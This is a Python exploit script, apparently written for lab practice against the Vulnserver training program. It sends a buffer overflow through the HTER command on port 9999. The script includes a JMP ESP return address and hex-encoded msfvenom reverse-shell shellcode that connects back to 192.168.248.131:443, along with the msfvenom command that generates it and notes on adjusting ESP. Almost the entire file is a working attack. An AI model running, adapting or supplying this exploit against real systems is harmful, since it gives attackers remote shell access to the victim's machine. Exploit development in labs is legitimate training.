import socket
import os
import sys
from subprocess import Popen,PIPE
import struct

'''
Notes : In this case, esp and EIP was pointing to same address 
		therefore we have prefixed our shellcode with 0x60 PUSHAD 
		instruction to adjust ESP lower than EIP inorder to resume normal program execution
'''

def line_send_tcp(host,port,payload_list = [],recv_first=None):
	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect((host,int(port)))
	if len(payload_list):
		if recv_first:
			print s.recv(1024)
		for i in payload_list:
			s.send(i)
			print s.recv(1024)
	s.close()

# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.248.131 LPORT=443 -b "\x00" -f hex -a x86 --platform windows EXITFUNC=thread
# Final size of hex file: 702 bytes

buf = (
'60dad4d97424f45a29c9bb7803c150b1'
'52315a1783c20403221023a52efe2146'
'ceff45ce2bce45b4386176be6c8efd92'
'8405733babae3e1d822f125d85b369b2'
'658da1c764cadc2a3483ab99a8a0e621'
'43fae721b04b090367c750838604e98a'
'9049d4452bb9a257fdf34bfbc03bbe05'
'05fb21707fffdc83447d3b015e25c8b1'
'bad71d2749dbea2315f8ede02e046507'
'e08c3d2c24d4e64d7db049719d1b35d7'
'd6b6226ab5de8747451f80d0362d0f4b'
'd01dd8552761f322b79cfc529e5aa802'
'884bd1c84873045e18dbf71fc89ba7f7'
'021497e82dfeb083d4697ffb2eea17fe'
'ceec5c772884b2dee3312a7b7fa3b351'
'fae33856fbaac813ef5b396e4dcd4644'
'f991d503f9dcc59bae8938d23a24624c'
'58b5f2b7d862c736e1e7731df1317b19'
'a5ed2af7134885b9cd027a1099d3b0a3'
'dfdb9c553f6d492040421da439bebd4b'
'907adda930777674d13a1b870c782204'
'a401d114cd049d923e758e76402aaf52'
)

adjust_esp = "505c" # PUSH EAX,POP ESP Can use these instructions too to lower down the ESP with respect to EIP

jmp_esp = "03125062"

payload = [
			"HTER %s\n" %('A'*2041+jmp_esp+buf+"90"*(1024-len(buf)-12))
		]

# ABCDEF 123456789
host = "192.168.248.130"
port = 9999

line_send_tcp(host,port,payload_list=payload,recv_first=True)